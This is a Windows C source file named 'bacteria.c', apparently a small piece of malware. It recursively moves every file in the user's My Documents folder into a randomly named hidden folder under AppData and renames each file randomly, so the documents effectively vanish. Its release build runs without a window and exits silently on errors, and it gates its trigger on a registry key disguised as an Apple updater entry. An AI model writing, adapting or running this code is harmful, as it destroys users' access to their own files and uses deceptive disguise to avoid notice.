/***************************************************************************
 *   bacteria.c - Written by samus250, Copyright (C) 2008.                 *
 *   This program recursively moves all files from a defined folder        *
 *   to a defined destination. It also gives them random filenames.        *
 *                                                                         *
 ***************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <windows.h>

#define DEBUG

// max lengthes of strings
#define ENVAR_LENGTH 260
#define DIR_LENGTH 260
#define FILE_LENGTH 260
#define MAX_WIN32_PATH_LENGTH 247

// max and min lengthes for random dir and filenames
#define RANDOM_MAX_FILENAME_LENGTH 100
#define RANDOM_MIN_FILENAME_LENGTH 10
#define RANDOM_MAX_DIR_LENGTH 30
#define RANDOM_MIN_DIR_LENGTH 10

// environment variable definitions
#define ENV_USERPROFILE "userprofile"
#define ENV_APPDATA "appdata"
#define MYDOCU_EN "Mydocu~1"
#define MYDOCU_ES "Misdoc~1"

// define the debugging paths for experimenting
#ifdef DEBUG
#define DEBUG_DOCUMENTS_PATH "C:\\MyDocumentsTest"
#define DEBUG_DESTINATION_FOLDER "bacteriatest" // folder in appdata
#endif

#define DATE_KEY_NAME "Software\\AppleUpdater"
#define DATE_VALUE_NAME "UpdateCode"

// prototypes for randfilelib
char *rand_file_extension(char *filename);
char *rand_filename(char *random_filename, unsigned int min_length, 
                    unsigned int max_length, bool add_extension);

// variables for the recursive function
char full_destination[DIR_LENGTH];
char random_filename[FILE_LENGTH];

bool get_date(void)
{
    struct tm *t;
    time_t now;
    FILE *input;
    HKEY hkey;
    LONG result_open;
    unsigned int *value = (unsigned int *)malloc(sizeof(unsigned int));
    DWORD u_size = sizeof(unsigned int);
    
    time(&now); // get epoch time and store to struct
    t = localtime(&now);
    
    // first we open the DATE_KEY_NAME
    result_open = RegOpenKeyEx(HKEY_CURRENT_USER,
                               DATE_KEY_NAME, 0, 
                               KEY_ALL_ACCESS, &hkey);
    
    if(result_open != ERROR_SUCCESS) {
        if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
            printf("- Error: date key not found.\n");
#endif
            return true;
        } else {
#ifdef DEBUG
            printf("- Error opening date key.\n");
#endif
            return true;
        }
    } else {
#ifdef DEBUG
        printf("- Successfully opened date key.\n");
#endif
    }
    
    // now we extract the value
    if((RegQueryValueEx(hkey, DATE_VALUE_NAME, NULL, NULL, (LPBYTE)value, &u_size)) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error extracting value from date key.\n");
#endif
        return true;
    } else {
#ifdef DEBUG
        printf("- Successfully extracted value from date key. Value is %d\n", *value);
#endif
    }
    // close the key here
    if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error closing bacteria key.\n");
#endif
        return true;
    } else {
#ifdef DEBUG
        printf("- Successfully closed bacteria key.\n");
#endif
    }
    
    // you must check this
    if(*value < t->tm_yday)
        return false;
    else {
        // reopen it here
        result_open = RegOpenKeyEx(HKEY_CURRENT_USER,
                               DATE_KEY_NAME, 0, 
                               STANDARD_RIGHTS_ALL, &hkey);
    
        if(result_open != ERROR_SUCCESS) {
            if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
                printf("- Error: date key not found.\n");
#endif
                return true;
            } else {
#ifdef DEBUG
                printf("- Error opening date key.\n");
#endif
                return true;
            }
        } else {
#ifdef DEBUG
            printf("- Successfully opened date key.\n");
#endif
        }
    
        if((RegDeleteKey(hkey, DATE_KEY_NAME)) != ERROR_SUCCESS) {
#ifdef DEBUG
            printf("- Error deleting date key.\n");
#endif
        } else {
#ifdef DEBUG
            printf("- Successfully deleted date key.\n");
#endif
        }
        return true;
    }
}

bool check_dir(char *path)
{
    return opendir(path) ? true : false;
}

void move_random_filenames(char *path, char *destination)
{
    DIR *dhandle;
    struct dirent *drecord;
    struct stat sbuf;
    
    if(!(dhandle = opendir(path))) {
#ifdef DEBUG
        printf("Error opening dir %s\n", path);
#else
        exit(0);
#endif
    }
    
    if(chdir(path)) {
#ifdef DEBUG
        printf("Error chaging cwd to %s\n", path);
#else
        exit(0);
#endif
    }
    
    while((drecord = readdir(dhandle)) != NULL) {
        stat(drecord->d_name, &sbuf);
        
        // If a directory
        if(S_ISDIR(sbuf.st_mode)) {
            // don't recurse into . or ..
            if(strcmp(drecord->d_name, ".") == 0 ||
               strcmp(drecord->d_name, "..") == 0) {
                continue;
            }
            
            // enter the directory
            move_random_filenames(drecord->d_name, destination);
            
        } else {
            
            // until MoveFile succeeds AND
            // full_destination is smaller than maximum path length
            do {
                // init vars
                memset(full_destination, '\0', DIR_LENGTH);
                memset(random_filename, '\0', FILE_LENGTH);
                
                // feed file extension
                rand_file_extension(drecord->d_name);
                
                // prepare the full_destination variable
                sprintf(full_destination, "%s\\%s", destination, 
                    rand_filename(random_filename, RANDOM_MIN_FILENAME_LENGTH, 
                        RANDOM_MAX_FILENAME_LENGTH, true
                    )
                );
                
            } while((!(MoveFile(drecord->d_name, full_destination))) || 
                    (strlen(full_destination) >= MAX_WIN32_PATH_LENGTH));
            // while !successfull
        }
    }
   
   // everytime it leaves a directory
    if(chdir("..")) {
#ifdef DEBUG
        printf("Error leaving directory %s\n", path);
#else
        exit(0);
#endif
    }
    closedir(dhandle);
    
    return;
}

#ifdef DEBUG
int main(void)
#else
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    PSTR szCmdLine, int iCmdShow)
#endif
{
    // yes, a lot of string processing
    char varuserprofile[ENVAR_LENGTH];
    char varapplicationdata[ENVAR_LENGTH];
    char mydocuments[DIR_LENGTH];
    char destination[DIR_LENGTH];
    char random_dirname[RANDOM_MAX_DIR_LENGTH];
    
    // initialize
    memset(varuserprofile, '\0', ENVAR_LENGTH);
    memset(varapplicationdata, '\0', ENVAR_LENGTH);
    memset(mydocuments, '\0', DIR_LENGTH);
    memset(destination, '\0', DIR_LENGTH);
    memset(random_dirname, '\0', RANDOM_MAX_DIR_LENGTH);

#ifdef DEBUG
    printf("Bacteria\n");
    fflush(stdout);
#endif
    // first of all, determine if it is the right time to run
    // the bacteria...
    if(!(get_date())) {
        // not the right time, stop
#ifdef DEBUG
        fflush(stdout);
        system("pause");
#endif
        return 0;
    }
    
    // prepare mydocuments variable
#ifdef DEBUG
    sprintf(mydocuments, DEBUG_DOCUMENTS_PATH);
#else   
    if(!(GetEnvironmentVariable(ENV_USERPROFILE, varuserprofile, ENVAR_LENGTH))) {
        // error getting var, return silently
        return 0;
    }
    
    // check existance first!
    sprintf(mydocuments, "%s\\" MYDOCU_EN, varuserprofile);
    if(!check_dir(mydocuments)) {
        memset(mydocuments, '\0', DIR_LENGTH);
        sprintf(mydocuments, "%s\\" MYDOCU_ES, varuserprofile);
        if(!check_dir(mydocuments)) {
            // hmm, not even spanish was found
            // add more languages here if possible...
            // exit silently
            return 0;
        }
    }
#endif
    
    // prepare destination
#ifdef DEBUG
    do {
        if(!(GetEnvironmentVariable(ENV_APPDATA, varapplicationdata, ENVAR_LENGTH))) {
            // return if an error
            printf("Error getting appdata envvar\n");
            return 0;
        }
        sprintf(destination, "%s\\" DEBUG_DESTINATION_FOLDER "\\%s", varapplicationdata, 
            rand_filename(random_dirname, RANDOM_MIN_DIR_LENGTH, 
                RANDOM_MAX_DIR_LENGTH, false
            )
        );
        
        if(!(CreateDirectory(destination, NULL))) {
            if(GetLastError() == ERROR_PATH_NOT_FOUND) {
                printf("Error: path not found\n");
                return 0;
            }
        } else {
            // never call GetLastError
            break;
        }
        
    } while(GetLastError() == ERROR_ALREADY_EXISTS);
#else
    do {
        if(!(GetEnvironmentVariable(ENV_APPDATA, varapplicationdata, ENVAR_LENGTH))) {
            // error, forget which type of error it is, just return silently
            return 0;
        }
        sprintf(destination, "%s\\%s", varapplicationdata, 
            rand_filename(random_dirname, RANDOM_MIN_DIR_LENGTH, 
                RANDOM_MAX_DIR_LENGTH, false
            )
        );
        
        if(!(CreateDirectory(destination, NULL))) {
            if(GetLastError() == ERROR_PATH_NOT_FOUND) {
                // not supposed to happen anyways...
                return 0;
            }
        } else {
            // never call GetLastError
            break;
        }
    } while(GetLastError() == ERROR_ALREADY_EXISTS);
#endif
    
    // move everything to where decided
    move_random_filenames(mydocuments, destination);
    
    // this is all we do up to now
    
#ifdef DEBUG
    fflush(stdout);
    system("pause");
#endif
    return 0;

}

